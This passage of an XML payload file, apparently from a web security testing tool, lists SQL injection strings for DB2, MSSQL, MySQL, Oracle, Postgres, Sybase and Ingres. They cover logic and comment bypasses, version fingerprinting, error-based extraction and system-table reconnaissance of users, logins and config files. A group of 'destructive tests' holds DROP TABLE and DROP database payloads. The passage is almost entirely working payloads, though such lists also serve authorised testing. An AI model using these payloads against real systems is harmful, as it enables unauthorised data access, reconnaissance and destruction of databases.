		<name>x' IS NOT NULL#(</name>
		<code>x' IS NOT NULL#(</code>
		<desc>*: x' IS NOT NULL#(</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' XOR'1</name>
		<code>x' XOR'1</code>
		<desc>*: x' XOR'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' IN('z')#(</name>
		<code>x' IN('z')#(</code>
		<desc>*: x' IN('z')#(</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'!='1</name>
		<code>x'!='1</code>
		<desc>*: x'!='1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'!=~'1</name>
		<code>x'!=~'1</code>
		<desc>*: x'!=~'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'=('z')#(</name>
		<code>x'=('z')#(</code>
		<desc>*: x'=('z')#(</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'|+'1</name>
		<code>x'|+'1</code>
		<desc>*: x'|+'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'|!'z</name>
		<code>x'|!'z</code>
		<desc>*: x'|!'z</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'^!'z</name>
		<code>x'^!'z</code>
		<desc>*: x'^!'z</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'/0 IS null #(</name>
		<code>x'/0 IS null #(</code>
		<desc>*: x'/0 IS null #(</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' DIV+1='z</name>
		<code>x' DIV+1='z</code>
		<desc>*: x' DIV+1='z</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' DIV null IS null #(</name>
		<code>x' DIV null IS null #(</code>
		<desc>*: x' DIV null IS null #(</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' IN('xx') OR-1!='0</name>
		<code>x' IN('xx') OR-1!='0</code>
		<desc>*: x' IN('xx') OR-1!='0</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' IS NOT NULL OR+1=+'1</name>
		<code>x' IS NOT NULL OR+1=+'1</code>
		<desc>*: x' IS NOT NULL OR+1=+'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x'!=ASCII(1) OR-1=-'1</name>
		<code>x'!=ASCII(1) OR-1=-'1</code>
		<desc>*: x'!=ASCII(1) OR-1=-'1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>logic tests</label>
		<name>x' AND 1=%%%%%%%%1'</name>
		<code>x' AND 1=%%%%%%%%1'</code>
		<desc>*: x' AND 1=%%%%%%%%1'</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1;</name>
		<code>1;</code>
		<desc>*: 1;</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1*</name>
		<code>1*</code>
		<desc>*: 1*</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1#</name>
		<code>1#</code>
		<desc>*: 1#</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1-</name>
		<code>1-</code>
		<desc>*: 1-</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1--</name>
		<code>1--</code>
		<desc>*: 1--</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1 --</name>
		<code>1 --</code>
		<desc>DB2: 1 --</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1 --</name>
		<code>1 --</code>
		<desc>Ingres: 1 --</desc>
		<browser>Ingres</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1 /**/1</name>
		<code>1 /**/1</code>
		<desc>Ingres: 1 /**/1</desc>
		<browser>Ingres</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1-- #</name>
		<code>1-- #</code>
		<desc>MySQL: 1-- #</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1/*</name>
		<code>1/*</code>
		<desc>*: 1/*</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>;-- -{alphanums}- /*#</name>
		<code>;-- -{alphanums}- /*#</code>
		<desc>*: ;-- -{alphanums}- /*#</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>all in one</name>
		<code>;--*/*#</code>
		<desc>*: ;--*/*#</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1-- </name>
		<code>1-- </code>
		<desc>Oracle: 1-- </desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1/*--*/1</name>
		<code>1/*--*/1</code>
		<desc>Oracle: 1/*--*/1</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>1''--</name>
		<code>1''--</code>
		<desc>Sybase: 1''--</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>(plain)</name>
		<code>(plain)</code>
		<desc>MySQL: (plain)</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>(hash)</name>
		<code>(hash)</code>
		<desc>MySQL: (hash)</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>(TAB\t)</name>
		<code>(TAB\t)</code>
		<desc>MySQL: (TAB\t)</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>(TAB)</name>
		<code>(TAB)</code>
		<desc>MySQL: (TAB)</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>comment tests</label>
		<name>simulate/**/space</name>
		<code>simulate/**/space</code>
		<desc>*: simulate/**/space</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>wildcard/pattern tests</label>
		<name>single character</name>
		<code>_</code>
		<desc>*: _</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>wildcard/pattern tests</label>
		<name>string</name>
		<code>%</code>
		<desc>*: %</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>wildcard/pattern tests</label>
		<name>pattern</name>
		<code>[A-Z]</code>
		<desc>MySQL: [A-Z]</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>wildcard/pattern tests</label>
		<name>negation</name>
		<code>!</code>
		<desc>MySQL: !</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>id=111      # integer</name>
		<code>id=111      # integer</code>
		<desc>*: id=111      # integer</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>id=0x6f     # hex</name>
		<code>id=0x6f     # hex</code>
		<desc>*: id=0x6f     # hex</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>id=0157     # octal</name>
		<code>id=0157     # octal</code>
		<desc>*: id=0157     # octal</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>id=110+1    # 110%2b1</name>
		<code>id=110+1    # 110%2b1</code>
		<desc>*: id=110+1    # 110%2b1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>id=112-1    #</name>
		<code>id=112-1    #</code>
		<desc>*: id=112-1    #</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>id=MOD(111,112)  # MOD(0,a) forces </name>
		<code>id=MOD(111,112)  # MOD(0,a) forces error</code>
		<desc>*: id=MOD(111,112)  # MOD(0,a) forces error</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>id=REPEAT(1,3)</name>
		<code>id=REPEAT(1,3)</code>
		<desc>*: id=REPEAT(1,3)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>number tests</label>
		<name>id=COALESCE(NULL,NULL,111)</name>
		<code>id=COALESCE(NULL,NULL,111)</code>
		<desc>*: id=COALESCE(NULL,NULL,111)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=sik</name>
		<code>id=sik</code>
		<desc>*: id=sik</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=REVERSE(kis)</name>
		<code>id=REVERSE(kis)</code>
		<desc>*: id=REVERSE(kis)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=GREATEST(0x11,0x12,0x13)</name>
		<code>id=GREATEST(0x11,0x12,0x13)</code>
		<desc>*: id=GREATEST(0x11,0x12,0x13)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=LEAST(0x11,0x11)</name>
		<code>id=LEAST(0x11,0x11)</code>
		<desc>*: id=LEAST(0x11,0x11)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CONCAT('ad','min')</name>
		<code>id=CONCAT('ad','min')</code>
		<desc>Oracle: id=CONCAT('ad','min')</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CONCAT('ad','min')</name>
		<code>id=CONCAT('ad','min')</code>
		<desc>DB2: id=CONCAT('ad','min')</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CONCAT('ad','min')</name>
		<code>id=CONCAT('ad','min')</code>
		<desc>MSSQL: id=CONCAT('ad','min')</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CONCAT('ad','min')</name>
		<code>id=CONCAT('ad','min')</code>
		<desc>MySQL: id=CONCAT('ad','min')</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CONCAT('ad','min')</name>
		<code>id=CONCAT('ad','min')</code>
		<desc>Sybase: id=CONCAT('ad','min')</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=('ad'+'min')</name>
		<code>id=('ad'+'min')</code>
		<desc>MSSQL: id=('ad'+'min')</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CHAR(83)+CHAR(81)+CHAR(76)</name>
		<code>id=CHAR(83)+CHAR(81)+CHAR(76)</code>
		<desc>MSSQL: id=CHAR(83)+CHAR(81)+CHAR(76)</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=nchar(83)+nchar(81)+nchar(76)</name>
		<code>id=nchar(83)+nchar(81)+nchar(76)</code>
		<desc>MSSQL: id=nchar(83)+nchar(81)+nchar(76)</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CHR(83)||CHR(81)||CHR(76)</name>
		<code>id=CHR(83)||CHR(81)||CHR(76)</code>
		<desc>Postgre: id=CHR(83)||CHR(81)||CHR(76)</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CONCAT(CHR(83),CHR(81),CHR(76))</name>
		<code>id=CONCAT(CHR(83),CHR(81),CHR(76))</code>
		<desc>Oracle: id=CONCAT(CHR(83),CHR(81),CHR(76))</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CHR(83)||CHR(81)||CHR(76)</name>
		<code>id=CHR(83)||CHR(81)||CHR(76)</code>
		<desc>Oracle: id=CHR(83)||CHR(81)||CHR(76)</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=CHAR(83,81,76)</name>
		<code>id=CHAR(83,81,76)</code>
		<desc>MySQL: id=CHAR(83,81,76)</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>string function tests</label>
		<name>id=0x53514c</name>
		<code>id=0x53514c</code>
		<desc>MySQL: id=0x53514c</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP 1</name>
		<code>1 REGEXP 1</code>
		<desc>MySQL: return true</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP ""</name>
		<code>1 REGEXP ""</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP IF(1=1,1,'')</name>
		<code>1 REGEXP IF(1=1,1,'')</code>
		<desc>MySQL: return true</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP IF(1=2,1,'')</name>
		<code>1 REGEXP IF(1=2,1,'')</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP ''</name>
		<code>1 REGEXP ''</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP '('</name>
		<code>1 REGEXP '('</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP '['</name>
		<code>1 REGEXP '['</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP '\\'</name>
		<code>1 REGEXP '\\'</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP '*'</name>
		<code>1 REGEXP '*'</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP 'a{1,1,1}'</name>
		<code>1 REGEXP 'a{1,1,1}'</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP '[a-9]'</name>
		<code>1 REGEXP '[a-9]'</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP 'a{1,'</name>
		<code>1 REGEXP 'a{1,'</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP '[[.ab.]]'</name>
		<code>1 REGEXP '[[.ab.]]'</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>REGEX functions</label>
		<name>1 REGEXP '[[:ab:]]'</name>
		<code>1 REGEXP '[[:ab:]]'</code>
		<desc>MySQL: throw error</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>SYSDATE</name>
		<code>SYSDATE</code>
		<desc>Oracle: SYSDATE</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>GETDATE()</name>
		<code>GETDATE()</code>
		<desc>MSSQL: GETDATE()</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>1 and(1)=convert(int,@@version)--</name>
		<code>1 and(1)=convert(int,@@version)--</code>
		<desc>MSSQL: 1 and(1)=convert(int,@@version)--</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>/*!32302+AND+0+*/</name>
		<code>/*!32302+AND+0+*/</code>
		<desc>MySQL: /*!32302+AND+0+*/</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>/*!32302+AND+0+*//*</name>
		<code>/*!32302+AND+0+*//*</code>
		<desc>MySQL: /*!32302+AND+0+*//*</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>/*!32302+AND+1+*//*</name>
		<code>/*!32302+AND+1+*//*</code>
		<desc>MySQL: /*!32302+AND+1+*//*</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name># Test MySQL-Version 5.0.28</name>
		<code># Test MySQL-Version 5.0.28</code>
		<desc>MySQL: # Test MySQL-Version 5.0.28</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>SELECT * FROM TABLE WHERE id=5 /*!5</name>
		<code>SELECT * FROM TABLE WHERE id=5 /*!50028 test */</code>
		<desc>MySQL: SELECT * FROM TABLE WHERE id=5 /*!50028 test */</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>1 and row(1,1)&gt;(select count(*),</name>
		<code>1 and row(1,1)&gt;(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)--</code>
		<desc>MySQL: 1 and row(1,1)&gt;(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)--</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>(1)and(select 1 from(select count(*</name>
		<code>(1)and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from TABLE_NAME group by x)a)--</code>
		<desc>MySQL: (1)and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from TABLE_NAME group by x)a)--</desc>
		<browser>MySQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>1 and(1)=cast(version() as numeric)</name>
		<code>1 and(1)=cast(version() as numeric)--</code>
		<desc>Postgre: 1 and(1)=cast(version() as numeric)--</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>1 and(1)=convert(int,@@version)--</name>
		<code>1 and(1)=convert(int,@@version)--</code>
		<desc>Sybase: 1 and(1)=convert(int,@@version)--</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>1 and(1)=convert(int,@@version)--</name>
		<code>1 and(1)=convert(int,@@version)--</code>
		<desc>MSSQL: 1 and(1)=convert(int,@@version)--</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>select XMLType((select substr(versi</name>
		<code>select XMLType((select substr(version,1,1) from v$instance)) from users;</code>
		<desc>Oracle: select XMLType((select substr(version,1,1) from v$instance)) from users;</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>select XMLType((select substr(versi</name>
		<code>select XMLType((select substr(version,2,1) from v$instance)) from users;</code>
		<desc>Oracle: select XMLType((select substr(version,2,1) from v$instance)) from users;</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>DB type/versions</label>
		<name>select XMLType((select substr(versi</name>
		<code>select XMLType((select substr(version,3,1) from v$instance)) from users;</code>
		<desc>Oracle: select XMLType((select substr(version,3,1) from v$instance)) from users;</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>void functions</label>
		<name>x' or ISNULL(1/0) #(</name>
		<code>x' or ISNULL(1/0) #(</code>
		<desc>*: x' or ISNULL(1/0) #(</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>void functions</label>
		<name>x' or LEAST(2,1) -- -x</name>
		<code>x' or LEAST(2,1) -- -x</code>
		<desc>*: x' or LEAST(2,1) -- -x</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>1 *@@version*-0 = 1</name>
		<code>1 *@@version*-0 = 1</code>
		<desc>MSSQL: 1 *@@version*-0 = 1</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' *@@version*-0 = '0</name>
		<code>x' *@@version*-0 = '0</code>
		<desc>MSSQL: x' *@@version*-0 = '0</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' *@v OR '1</name>
		<code>x' *@v OR '1</code>
		<desc>MSSQL: x' *@v OR '1</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' *@v IS null - '</name>
		<code>x' *@v IS null - '</code>
		<desc>MSSQL: x' *@v IS null - '</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' @@error IS null - '</name>
		<code>x' @@error IS null - '</code>
		<desc>MSSQL: x' @@error IS null - '</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' @@identity IS null - '</name>
		<code>x' @@identity IS null - '</code>
		<desc>MSSQL: x' @@identity IS null - '</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' @@nestlevel IS null - '</name>
		<code>x' @@nestlevel IS null - '</code>
		<desc>MSSQL: x' @@nestlevel IS null - '</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' @@procid IS null - '</name>
		<code>x' @@procid IS null - '</code>
		<desc>MSSQL: x' @@procid IS null - '</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' @@rowcount IS null - '</name>
		<code>x' @@rowcount IS null - '</code>
		<desc>MSSQL: x' @@rowcount IS null - '</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' @@servername IS null - '</name>
		<code>x' @@servername IS null - '</code>
		<desc>MSSQL: x' @@servername IS null - '</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' *UTC_TIME OR '1</name>
		<code>x' *UTC_TIME OR '1</code>
		<desc>*: x' *UTC_TIME OR '1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' *null OR '1</name>
		<code>x' *null OR '1</code>
		<desc>*: x' *null OR '1</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>x' *null IS null - '</name>
		<code>x' *null IS null - '</code>
		<desc>*: x' *null IS null - '</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select versionnumber, version_times</name>
		<code>select versionnumber, version_timestamp from sysibm.sysversions</code>
		<desc>common SQL</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select user from sysibm.sysdummy1</name>
		<code>select user from sysibm.sysdummy1</code>
		<desc>common SQL</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select session_user from sysibm.sys</name>
		<code>select session_user from sysibm.sysdummy1</code>
		<desc>common SQL</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select system_user from sysibm.sysd</name>
		<code>select system_user from sysibm.sysdummy1</code>
		<desc>common SQL</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current server from sysibm.s</name>
		<code>select current server from sysibm.sysdummy1</code>
		<desc>common SQL</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select name from sysibm.systables</name>
		<code>select name from sysibm.systables</code>
		<desc>common SQL</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select name, tbname, coltype from s</name>
		<code>select name, tbname, coltype from sysibm.syscolumns</code>
		<desc>common SQL</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select grantee from syscat.dbauth</name>
		<code>select grantee from syscat.dbauth</code>
		<desc>common SQL</desc>
		<browser>DB2</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select @@version</name>
		<code>select @@version</code>
		<desc>common SQL</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select @@servername</name>
		<code>select @@servername</code>
		<desc>common SQL</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select @@microsoftversion</name>
		<code>select @@microsoftversion</code>
		<desc>common SQL</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select * from master..sysservers</name>
		<code>select * from master..sysservers</code>
		<desc>common SQL</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select * from sysusers</name>
		<code>select * from sysusers</code>
		<desc>common SQL</desc>
		<browser>MSSQL</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select version()</name>
		<code>select version()</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_database()</name>
		<code>select current_database()</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_user</name>
		<code>select current_user</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select session_user</name>
		<code>select session_user</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('log_connect</name>
		<code>select current_setting('log_connections')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('log_stateme</name>
		<code>select current_setting('log_statement')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('port')</name>
		<code>select current_setting('port')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('password_en</name>
		<code>select current_setting('password_encryption')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('krb_server_</name>
		<code>select current_setting('krb_server_keyfile')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('virtual_hos</name>
		<code>select current_setting('virtual_host')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('port')</name>
		<code>select current_setting('port')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('config_file</name>
		<code>select current_setting('config_file')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('hba_file')</name>
		<code>select current_setting('hba_file')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select current_setting('data_direct</name>
		<code>select current_setting('data_directory')</code>
		<desc>common SQL</desc>
		<browser>Postgre</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select @@version''--</name>
		<code>select @@version''--</code>
		<desc>common SQL</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select * from master..syslogins''--</name>
		<code>select * from master..syslogins''--</code>
		<desc>common SQL</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>system variables</label>
		<name>select * from master..sysdatabases'</name>
		<code>select * from master..sysdatabases''--</code>
		<desc>common SQL</desc>
		<browser>Sybase</browser>
	</attack>
	<attack>
		<label>joined commands</label>
		<name>ORDER BY 1--</name>
		<code>ORDER BY 1--</code>
		<desc>*: ORDER BY 1--</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>joined commands</label>
		<name>x' OR 'q'='q' ORDER BY 1 ASC;#--*/*</name>
		<code>x' OR 'q'='q' ORDER BY 1 ASC;#--*/*</code>
		<desc>*: x' OR 'q'='q' ORDER BY 1 ASC;#--*/*</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>joined commands</label>
		<name>x' OR 'q'='q' ORDER BY 2 ASC;#--*/*</name>
		<code>x' OR 'q'='q' ORDER BY 2 ASC;#--*/*</code>
		<desc>*: x' OR 'q'='q' ORDER BY 2 ASC;#--*/*</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>joined commands</label>
		<name>x' OR 'q'='q' ORDER BY 1 DESC;#--*/</name>
		<code>x' OR 'q'='q' ORDER BY 1 DESC;#--*/*</code>
		<desc>*: x' OR 'q'='q' ORDER BY 1 DESC;#--*/*</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>joined commands</label>
		<name>x' OR 'q'='q' ORDER BY 2 DESC;#--*/</name>
		<code>x' OR 'q'='q' ORDER BY 2 DESC;#--*/*</code>
		<desc>*: x' OR 'q'='q' ORDER BY 2 DESC;#--*/*</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>'; DROP TABLE users--</name>
		<code>'; DROP TABLE users--</code>
		<desc>Oracle: '; DROP TABLE users--</desc>
		<browser>Oracle</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>ORDER BY 1 DROP TABLE users</name>
		<code>ORDER BY 1 DROP TABLE users</code>
		<desc>*: ORDER BY 1 DROP TABLE users</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>1 OR (DROP TABLE users)=(1)</name>
		<code>1 OR (DROP TABLE users)=(1)</code>
		<desc>*: 1 OR (DROP TABLE users)=(1)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x' OR (DROP TABLE users)=(1)</name>
		<code>x' OR (DROP TABLE users)=(1)</code>
		<desc>*: x' OR (DROP TABLE users)=(1)</desc>
		<browser>*</browser>
	</attack>
	<attack>
		<label>destructive tests</label>
		<name>x'; DROP sys_db '</name>
		<code>x'; DROP sys_db '</code>
		<desc>MSSQL: x'; DROP sys_db '</desc>
		<browser>MSSQL</browser>
